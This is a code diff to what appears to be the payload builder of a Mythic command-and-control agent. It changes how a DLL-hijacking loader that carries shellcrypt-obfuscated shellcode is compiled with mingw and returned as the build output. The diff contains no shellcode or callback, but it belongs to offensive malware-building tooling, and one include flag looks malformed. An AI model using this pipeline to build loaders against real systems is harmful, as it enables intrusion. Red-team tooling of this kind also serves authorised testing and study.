@@ -333,7 +333,7 @@ NOTE: Does not (currently) support encoded or compressed payloads.
             shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
             shellcrypt_path = str(shellcrypt_path)
 
-            payload_path = PurePath(agent_build_path) / "payload"
+            payload_path = PurePath(agent_build_path) / "payload" / "payload.dll"
             payload_path = str(payload_path)
 
             templates_path = PurePath(agent_build_path) / "templates"
@@ -513,11 +513,11 @@ NOTE: Does not (currently) support encoded or compressed payloads.
                 ))
 
             cmd = [
-                "x86_64-w64-mingw32-gcc",
-                "-shared",
-                "-o", f"{payload_path}/payload.dll",
+                "x86_64-w64-mingw32-gcc-win32",
+                "-o", payload_path,
                 dll_hijack_template_path,
-                "-I/usr/x86_64-w64-mingw32/include",
+                "-shared",
+                "-I/usr/x86_64-w64-mingw32/include/windows.h",
                 "-Wall", "-w", "-s"
             ]
             proc = await asyncio.create_subprocess_exec(
@@ -532,21 +532,25 @@ NOTE: Does not (currently) support encoded or compressed payloads.
             if stderr:
                 output += f"[stderr]\n{stderr.decode()}"
 
-            if os.path.exists(f"{payload_path}/payload.dll"):
+            if os.path.exists(payload_path):
+                # Debug
+                response.payload = open(payload_path, "rb").read()
+
                 response.status = BuildStatus.Success
                 response.build_message = "DLL Compiled!"
-                response.build_stdout = output + "\n" + f"{payload_path}/payload.dll"
+                response.build_stdout = output + "\n" + payload_path
                 await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                     PayloadUUID=self.uuid,
                     StepName="Compiling DLL Payload",
                     StepStdout="DLL Loader Compiled!",
                     StepSuccess=True,
                 ))
+                return response
             else:
                 response.status = BuildStatus.Error
                 response.payload = b""
                 response.build_message = "Failed to compile DLL"
-                response.build_stderr = output + "\n" + obfuscated_shellcode_path
+                response.build_stderr = output + "\n" + payload_path
                 await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                     PayloadUUID=self.uuid,
                     StepName="Compiling DLL Payload",
